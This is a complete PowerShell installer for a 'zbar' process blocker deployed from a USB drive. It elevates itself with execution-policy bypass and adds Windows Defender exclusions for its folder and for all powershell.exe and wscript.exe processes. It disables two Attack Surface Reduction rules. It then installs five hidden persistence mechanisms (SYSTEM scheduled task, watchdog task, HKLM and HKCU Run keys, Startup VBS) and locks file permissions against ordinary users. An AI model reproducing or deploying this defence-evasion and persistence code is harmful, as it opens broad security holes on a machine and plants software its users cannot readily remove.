# zbar-install.ps1 - Main installer for zbar process blocker
# Copies files, sets up persistence, starts the blocker, verifies everything
# Called by Install.bat with -UsbDir pointing to the USB root

param(
    [Parameter(Mandatory = $false)]
    [string]$UsbDir = ""
)

# ============================================================
# GLOBALS
# ============================================================
$installDir    = "C:\ProgramData\zbar"
$taskName      = "zbar"
$log           = [System.Collections.ArrayList]::new()
$pass          = 0
$fail          = 0
$warn          = 0
$persistMethod = ""  # which persistence method succeeded

# ============================================================
# LOGGING HELPERS
# ============================================================
function Log {
    param([string]$Text, [string]$Color = "White")
    Write-Host $Text -ForegroundColor $Color
    $log.Add($Text) | Out-Null
}

function LogPass {
    param([string]$Text)
    $script:pass++
    Log "  [PASS] $Text" "Green"
}

function LogFail {
    param([string]$Text)
    $script:fail++
    Log "  [FAIL] $Text" "Red"
}

function LogWarn {
    param([string]$Text)
    $script:warn++
    Log "  [WARN] $Text" "Yellow"
}

function LogInfo {
    param([string]$Text)
    Log "  [INFO] $Text" "Cyan"
}

# ============================================================
# HEADER
# ============================================================
Log ""
Log "  ========================================================"
Log "   zbar - Installer"
Log "   $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
Log "  ========================================================"
Log ""

# ============================================================
# STEP 0: SELF-ELEVATE TO ADMIN
# ============================================================
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)

if (-not $isAdmin) {
    Log "  --- Requesting Administrator Elevation ---"
    try {
        $argList = "-ExecutionPolicy Bypass -File `"$PSCommandPath`" -UsbDir `"$UsbDir`""
        $proc = Start-Process powershell.exe -ArgumentList $argList -Verb RunAs -Wait -PassThru -ErrorAction Stop
        LogInfo "Elevated process exited with code $($proc.ExitCode). This non-admin window will close."
        exit $proc.ExitCode
    } catch {
        LogWarn "UAC elevation failed or was cancelled: $($_.Exception.Message)"
        LogWarn "Continuing WITHOUT admin privileges - some methods may fail"
        Log ""
    }
}

# Re-check admin status (we may be in the elevated process now)
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)
LogInfo "Running as admin: $isAdmin"
LogInfo "Computer: $env:COMPUTERNAME  |  User: $env:USERNAME"
LogInfo "UsbDir: $UsbDir"
Log ""

# ============================================================
# STEP 1: STOP EXISTING INSTANCE
# ============================================================
Log "  --- Stopping Existing Instance ---"
try {
    $existing = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
        Where-Object { $_.CommandLine -like "*zbar.ps1*" -and $_.ProcessId -ne $PID }
    if ($existing) {
        foreach ($p in $existing) {
            try {
                Stop-Process -Id $p.ProcessId -Force -ErrorAction Stop
                LogInfo "Killed existing zbar process PID $($p.ProcessId)"
            } catch {
                LogWarn "Could not kill PID $($p.ProcessId): $($_.Exception.Message)"
            }
        }
    } else {
        LogInfo "No existing zbar process found"
    }
} catch {
    LogWarn "Error checking for existing processes: $($_.Exception.Message)"
}

# Remove old scheduled task
try {
    $oldTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if ($oldTask) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction Stop
        LogInfo "Removed old scheduled task"
    }
} catch {
    LogWarn "Could not remove old scheduled task: $($_.Exception.Message)"
}

# Remove old registry entry
try {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regVal = Get-ItemProperty -Path $regPath -Name $taskName -ErrorAction SilentlyContinue
    if ($regVal) {
        Remove-ItemProperty -Path $regPath -Name $taskName -Force -ErrorAction Stop
        LogInfo "Removed old registry Run entry"
    }
} catch {
    LogWarn "Could not remove old registry entry: $($_.Exception.Message)"
}

# Remove old startup VBS files
foreach ($startupPath in @(
    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\zbar.vbs",
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\zbar.vbs"
)) {
    try {
        if (Test-Path $startupPath) {
            Remove-Item $startupPath -Force -ErrorAction Stop
            LogInfo "Removed old startup file: $startupPath"
        }
    } catch {
        LogWarn "Could not remove $startupPath : $($_.Exception.Message)"
    }
}

Log ""

# ============================================================
# STEP 2: COPY FILES
# ============================================================
Log "  --- Copying Files ---"

$sourceDir = ""
if ($UsbDir -and (Test-Path (Join-Path $UsbDir "payload"))) {
    $sourceDir = Join-Path $UsbDir "payload"
} elseif ($PSScriptRoot -and (Test-Path $PSScriptRoot)) {
    $sourceDir = $PSScriptRoot
}

if (-not $sourceDir -or -not (Test-Path $sourceDir)) {
    LogFail "Cannot find source payload directory (UsbDir='$UsbDir', PSScriptRoot='$PSScriptRoot')"
    Log ""
    Log "  INSTALLATION ABORTED - no source files."
    # Write report even on abort
    if ($UsbDir -and (Test-Path $UsbDir)) {
        $log | Out-File (Join-Path $UsbDir "install-report.txt") -Encoding utf8 -Force
    }
    exit 1
}

LogInfo "Source directory: $sourceDir"

# Create install directory
try {
    if (-not (Test-Path $installDir)) {
        New-Item -ItemType Directory -Path $installDir -Force -ErrorAction Stop | Out-Null
        LogInfo "Created install directory: $installDir"
    } else {
        LogInfo "Install directory already exists: $installDir"
    }
} catch {
    LogFail "Could not create install directory: $($_.Exception.Message)"
    if ($UsbDir -and (Test-Path $UsbDir)) {
        $log | Out-File (Join-Path $UsbDir "install-report.txt") -Encoding utf8 -Force
    }
    exit 1
}

# Copy each file
$filesToCopy = @("zbar.ps1", "blocklist.txt", "zbar-check.ps1", "zbar-launcher.vbs")
$allFilesCopied = $true

foreach ($fileName in $filesToCopy) {
    $src = Join-Path $sourceDir $fileName
    $dst = Join-Path $installDir $fileName
    try {
        if (Test-Path $src) {
            Copy-Item -Path $src -Destination $dst -Force -ErrorAction Stop
            # Verify copy
            if (Test-Path $dst) {
                $srcSize = (Get-Item $src).Length
                $dstSize = (Get-Item $dst).Length
                if ($srcSize -eq $dstSize) {
                    LogPass "$fileName copied and verified ($srcSize bytes)"
                } else {
                    LogFail "$fileName copied but size mismatch (src=$srcSize, dst=$dstSize)"
                    $allFilesCopied = $false
                }
            } else {
                LogFail "$fileName not found at destination after copy"
                $allFilesCopied = $false
            }
        } else {
            LogWarn "$fileName not found in source directory (skipped)"
            # Only fail for critical files
            if ($fileName -eq "zbar.ps1" -or $fileName -eq "blocklist.txt") {
                $allFilesCopied = $false
            }
        }
    } catch {
        LogFail "Failed to copy $fileName : $($_.Exception.Message)"
        $allFilesCopied = $false
    }
}

if (-not $allFilesCopied) {
    LogFail "Not all critical files were copied - installation may be incomplete"
}

Log ""

# ============================================================
# STEP 2.5: ADD WINDOWS DEFENDER EXCLUSION
# ============================================================
Log "  --- Windows Defender Exclusions ---"

# Path exclusion (files)
try {
    Add-MpPreference -ExclusionPath $installDir -ErrorAction Stop
    LogPass "Defender path exclusion: $installDir"
} catch {
    LogWarn "Path exclusion failed: $($_.Exception.Message)"
}

# Process exclusions (prevent behavioral detection from killing our tasks)
try {
    Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction Stop
    LogPass "Defender process exclusion: powershell.exe"
} catch {
    LogWarn "Process exclusion (powershell) failed: $($_.Exception.Message)"
}
try {
    Add-MpPreference -ExclusionProcess "wscript.exe" -ErrorAction Stop
    LogPass "Defender process exclusion: wscript.exe"
} catch {
    LogWarn "Process exclusion (wscript) failed: $($_.Exception.Message)"
}

# Disable Defender ASR rule that blocks persistence (if applicable)
try {
    # ASR rule: Block persistence through WMI event subscription
    Set-MpPreference -AttackSurfaceReductionRules_Ids "e6db77e5-3df2-4cf1-b95a-636979351e5b" -AttackSurfaceReductionRules_Actions Disabled -ErrorAction Stop
    LogPass "Defender ASR rule (WMI persistence block) disabled"
} catch {
    LogInfo "ASR rule adjustment skipped: $($_.Exception.Message)"
}
try {
    # ASR rule: Block process creations from scheduled tasks
    Set-MpPreference -AttackSurfaceReductionRules_Ids "d1e49aac-8f56-4280-b9ba-993a6d77406c" -AttackSurfaceReductionRules_Actions Disabled -ErrorAction Stop
    LogPass "Defender ASR rule (scheduled task block) disabled"
} catch {
    LogInfo "ASR rule adjustment skipped: $($_.Exception.Message)"
}

# ============================================================
# STEP 3: SET UP ALL PERSISTENCE METHODS (layered defense)
# ============================================================
Log "  --- Setting Up Persistence (ALL methods) ---"
LogInfo "Waiting 5 seconds for Defender exclusions to propagate..."
Start-Sleep -Seconds 5

# Copy VBS launcher for invisible execution
$vbsLauncher = Join-Path $installDir "zbar-launcher.vbs"
$vbsSrc = Join-Path $sourceDir "zbar-launcher.vbs"
if (Test-Path $vbsSrc) {
    Copy-Item -Path $vbsSrc -Destination $vbsLauncher -Force
    LogPass "VBS launcher copied (invisible window)"
} else {
    $vbsContent = 'Set shell = CreateObject("WScript.Shell")' + "`r`n" +
        'shell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File ""C:\ProgramData\zbar\zbar.ps1""", 0, False'
    [IO.File]::WriteAllText($vbsLauncher, $vbsContent)
    LogPass "VBS launcher created inline (invisible window)"
}

$psExe = "powershell.exe"
$psArg = "-ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File `"$installDir\zbar.ps1`""
$persistMethods = @()

# --- Layer 1: Scheduled Task (SYSTEM + Highest) ---
Log ""
LogInfo "Layer 1: Scheduled Task (SYSTEM + Highest)..."
try {
    $action = New-ScheduledTaskAction -Execute $psExe -Argument $psArg
    $trigger1 = New-ScheduledTaskTrigger -AtStartup
    $trigger2 = New-ScheduledTaskTrigger -AtLogOn
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
    $settings = New-ScheduledTaskSettingsSet `
        -AllowStartIfOnBatteries `
        -DontStopIfGoingOnBatteries `
        -StartWhenAvailable `
        -ExecutionTimeLimit (New-TimeSpan -Seconds 0) `
        -RestartInterval (New-TimeSpan -Minutes 1) `
        -RestartCount 999
    $settings.DisallowStartIfOnBatteries = $false
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger1,$trigger2 -Principal $principal -Settings $settings -Force -ErrorAction Stop | Out-Null
    LogPass "Scheduled task created (SYSTEM + Highest)"
    $persistMethods += "ScheduledTask (SYSTEM)"
} catch {
    LogWarn "Layer 1 failed: $($_.Exception.Message)"
}

# --- Layer 2: Watchdog Task (SYSTEM, every 5 min, restarts zbar if dead) ---
Log ""
LogInfo "Layer 2: Watchdog task (restarts zbar if killed)..."
try {
    $watchdogCmd = "-ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -Command `"if (-not (Get-CimInstance Win32_Process -Filter \`"Name='powershell.exe'\`" -EA SilentlyContinue | Where-Object { `$_.CommandLine -like '*zbar.ps1*' })) { Start-Process wscript.exe -ArgumentList '`\`"$vbsLauncher`\`"' -WindowStyle Hidden }`""
    $wdAction = New-ScheduledTaskAction -Execute $psExe -Argument $watchdogCmd
    $wdTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
    $wdPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
    $wdSettings = New-ScheduledTaskSettingsSet `
        -AllowStartIfOnBatteries `
        -DontStopIfGoingOnBatteries `
        -StartWhenAvailable `
        -ExecutionTimeLimit (New-TimeSpan -Minutes 2) `
        -MultipleInstances IgnoreNew
    $wdSettings.DisallowStartIfOnBatteries = $false
    Register-ScheduledTask -TaskName "zbar-watchdog" -Action $wdAction -Trigger $wdTrigger -Principal $wdPrincipal -Settings $wdSettings -Force -ErrorAction Stop | Out-Null
    LogPass "Watchdog task created (checks every 5 min, revives if dead)"
    $persistMethods += "Watchdog task"
} catch {
    LogWarn "Layer 2 failed: $($_.Exception.Message)"
}

# --- Layer 3: HKLM Registry Run key (needs admin, standard user can't remove) ---
Log ""
LogInfo "Layer 3: HKLM Registry Run key..."
try {
    $regPathLM = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regValue = "wscript.exe `"$vbsLauncher`""
    Set-ItemProperty -Path $regPathLM -Name $taskName -Value $regValue -Force -ErrorAction Stop
    $regCheck = Get-ItemProperty -Path $regPathLM -Name $taskName -ErrorAction SilentlyContinue
    if ($regCheck) {
        LogPass "HKLM Registry Run key created (admin-only)"
        $persistMethods += "HKLM Registry"
    } else {
        LogWarn "HKLM registry key set but verification failed"
    }
} catch {
    LogWarn "Layer 3 failed: $($_.Exception.Message)"
}

# --- Layer 4: All Users Startup folder ---
Log ""
LogInfo "Layer 4: All Users Startup folder..."
try {
    $startupVbs = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\zbar.vbs"
    $vbsStartupContent = @"
Set shell = CreateObject("WScript.Shell")
shell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File ""C:\ProgramData\zbar\zbar.ps1""", 0, False
"@
    $vbsStartupContent | Out-File -FilePath $startupVbs -Encoding ascii -Force -ErrorAction Stop
    if (Test-Path $startupVbs) {
        LogPass "All Users Startup .vbs installed"
        $persistMethods += "Startup folder"
    }
} catch {
    LogWarn "Layer 4 failed: $($_.Exception.Message)"
}

# --- Layer 5: HKCU Registry Run key (backup) ---
Log ""
LogInfo "Layer 5: HKCU Registry Run key (backup)..."
try {
    $regPathCU = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regValue = "wscript.exe `"$vbsLauncher`""
    Set-ItemProperty -Path $regPathCU -Name $taskName -Value $regValue -Force -ErrorAction Stop
    LogPass "HKCU Registry Run key created (backup)"
    $persistMethods += "HKCU Registry"
} catch {
    LogWarn "Layer 5 failed: $($_.Exception.Message)"
}

# ============================================================
# STEP 3.5: LOCK DOWN FILE PERMISSIONS
# ============================================================
Log ""
Log "  --- Locking Down File Permissions ---"
try {
    $acl = Get-Acl $installDir
    # Remove inherited rules and add explicit ones
    $acl.SetAccessRuleProtection($true, $false)
    # SYSTEM: Full Control
    $systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule("SYSTEM", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
    $acl.AddAccessRule($systemRule)
    # Administrators: Full Control
    $adminRule = New-Object System.Security.AccessControl.FileSystemAccessRule("BUILTIN\Administrators", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
    $acl.AddAccessRule($adminRule)
    # Users: Read & Execute only (can't delete or modify)
    $userRule = New-Object System.Security.AccessControl.FileSystemAccessRule("BUILTIN\Users", "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")
    $acl.AddAccessRule($userRule)
    Set-Acl $installDir $acl -ErrorAction Stop
    LogPass "File permissions locked (Users: read-only, Admin/SYSTEM: full)"
} catch {
    LogWarn "ACL lockdown failed: $($_.Exception.Message)"
}

# Persistence summary
Log ""
if ($persistMethods.Count -gt 0) {
    $persistMethod = $persistMethods -join " + "
    LogPass "Persistence layers active ($($persistMethods.Count)): $persistMethod"
} else {
    LogFail "ALL persistence methods failed - zbar will NOT auto-start!"
    $persistMethod = "NONE"
}

Log ""

# ============================================================
# STEP 4: START PROCESS IMMEDIATELY
# ============================================================
Log "  --- Starting zbar Process ---"

$processStarted = $false

# Try schtasks /run first (only if a scheduled task was created)
if ($persistMethod -like "ScheduledTask*" -or $persistMethod -eq "schtasks.exe") {
    try {
        LogInfo "Attempting schtasks /run..."
        $runResult = & schtasks /run /tn $taskName 2>&1
        if ($LASTEXITCODE -eq 0) {
            LogInfo "Task started via schtasks /run"
            $processStarted = $true
        } else {
            LogWarn "schtasks /run failed: $runResult"
        }
    } catch {
        LogWarn "schtasks /run exception: $($_.Exception.Message)"
    }
}

# Fallback: direct launch
if (-not $processStarted) {
    try {
        LogInfo "Launching directly via Start-Process..."
        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$installDir\zbar.ps1`"" -WindowStyle Hidden -ErrorAction Stop
        LogInfo "Process launched directly"
        $processStarted = $true
    } catch {
        LogFail "Direct launch failed: $($_.Exception.Message)"
    }
}

# Wait for process to spin up
if ($processStarted) {
    LogInfo "Waiting 3 seconds for process to initialize..."
    Start-Sleep -Seconds 3
}

# Verify process is running
try {
    $runningProcs = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
        Where-Object { $_.CommandLine -like "*zbar.ps1*" -and $_.ProcessId -ne $PID }
    if ($runningProcs) {
        $p = $runningProcs | Select-Object -First 1
        LogPass "zbar process is running (PID $($p.ProcessId))"
    } else {
        LogFail "zbar process is NOT running after launch attempt"
    }
} catch {
    LogFail "Could not verify process status: $($_.Exception.Message)"
}

Log ""

# ============================================================
# STEP 5: POST-INSTALL VERIFICATION
# ============================================================
Log "  --- Post-Install Verification ---"
Log ""

# 5a. Files exist in install dir
Log "  Files:"
foreach ($f in @("zbar.ps1", "blocklist.txt", "zbar-check.ps1")) {
    $fPath = Join-Path $installDir $f
    try {
        if (Test-Path $fPath) {
            $size = (Get-Item $fPath).Length
            LogPass "$f present ($size bytes)"
        } else {
            if ($f -eq "zbar-check.ps1") {
                LogWarn "$f not found (optional)"
            } else {
                LogFail "$f MISSING"
            }
        }
    } catch {
        LogFail "Error checking $f : $($_.Exception.Message)"
    }
}
Log ""

# 5b. Persistence method is active
Log "  Persistence:"
$anyPersist = $false

try {
    $taskCheck = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if ($taskCheck) {
        LogPass "Scheduled task '$taskName' exists (State: $($taskCheck.State))"
        $anyPersist = $true
    } else {
        LogInfo "No scheduled task found"
    }
} catch {
    LogInfo "Could not query scheduled tasks: $($_.Exception.Message)"
}

try {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regCheck = Get-ItemProperty -Path $regPath -Name $taskName -ErrorAction SilentlyContinue
    if ($regCheck) {
        LogPass "Registry Run key exists"
        $anyPersist = $true
    } else {
        LogInfo "No registry Run key"
    }
} catch {
    LogInfo "Could not query registry: $($_.Exception.Message)"
}

foreach ($startupVbs in @(
    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\zbar.vbs",
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\zbar.vbs"
)) {
    try {
        if (Test-Path $startupVbs) {
            LogPass "Startup VBS exists: $startupVbs"
            $anyPersist = $true
        }
    } catch {}
}

if (-not $anyPersist) {
    LogFail "No persistence mechanism is active!"
}
Log ""

# 5c. Process is running
Log "  Process:"
try {
    $finalProcs = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
        Where-Object { $_.CommandLine -like "*zbar.ps1*" -and $_.ProcessId -ne $PID }
    if ($finalProcs) {
        $fp = $finalProcs | Select-Object -First 1
        LogPass "zbar is running (PID $($fp.ProcessId), started $($fp.CreationDate))"
    } else {
        LogFail "zbar is NOT running"
    }
} catch {
    LogFail "Process check error: $($_.Exception.Message)"
}
Log ""

# 5d. Blocklist is readable and has entries
Log "  Blocklist:"
try {
    $blPath = Join-Path $installDir "blocklist.txt"
    if (Test-Path $blPath) {
        $entries = @(Get-Content $blPath -ErrorAction Stop |
            ForEach-Object { $_.Trim() } |
            Where-Object { $_ -and $_ -notmatch '^\s*#' })
        if ($entries.Count -gt 0) {
            LogPass "Blocklist readable with $($entries.Count) active entries"
        } else {
            LogWarn "Blocklist exists but has 0 active entries"
        }
    } else {
        LogFail "Blocklist file not found at $blPath"
    }
} catch {
    LogFail "Blocklist read error: $($_.Exception.Message)"
}

Log ""

# ============================================================
# STEP 6: WRITE INSTALL REPORT
# ============================================================
$reportPath = ""
if ($UsbDir -and (Test-Path $UsbDir)) {
    $reportPath = Join-Path $UsbDir "install-report.txt"
} elseif ($PSScriptRoot) {
    $parentDir = Split-Path $PSScriptRoot -Parent -ErrorAction SilentlyContinue
    if ($parentDir -and (Test-Path $parentDir)) {
        $reportPath = Join-Path $parentDir "install-report.txt"
    }
}

if ($reportPath) {
    try {
        $log | Out-File $reportPath -Encoding utf8 -Force -ErrorAction Stop
        LogInfo "Install report saved to: $reportPath"
    } catch {
        LogWarn "Could not write install report: $($_.Exception.Message)"
    }
}

# ============================================================
# FINAL SUMMARY
# ============================================================
Log ""
Log "  ========================================================"
Log "   INSTALLATION SUMMARY"
Log "  ========================================================"
Log ""
Log "  Install dir:   $installDir"
Log "  Persistence:   $( if ($persistMethod) { $persistMethod } else { 'NONE' } )"
Log "  Admin:         $isAdmin"
Log ""
Log "  Results:       $pass PASS  |  $fail FAIL  |  $warn WARN"
Log ""

if ($fail -eq 0) {
    Log "  ========================================" "Green"
    Log "   INSTALL: PASS                         " "Green"
    Log "  ========================================" "Green"
} else {
    Log "  ========================================" "Red"
    Log "   INSTALL: FAIL ($fail issue(s))        " "Red"
    Log "  ========================================" "Red"
}

Log ""
Log "  Log file:      $installDir\zbar-log.txt"
Log "  Blocklist:     $installDir\blocklist.txt"
Log ""

# Write final report (including summary)
if ($reportPath) {
    try {
        $log | Out-File $reportPath -Encoding utf8 -Force
    } catch {}
}

# Exit code
if ($fail -eq 0) {
    exit 0
} else {
    exit 1
}
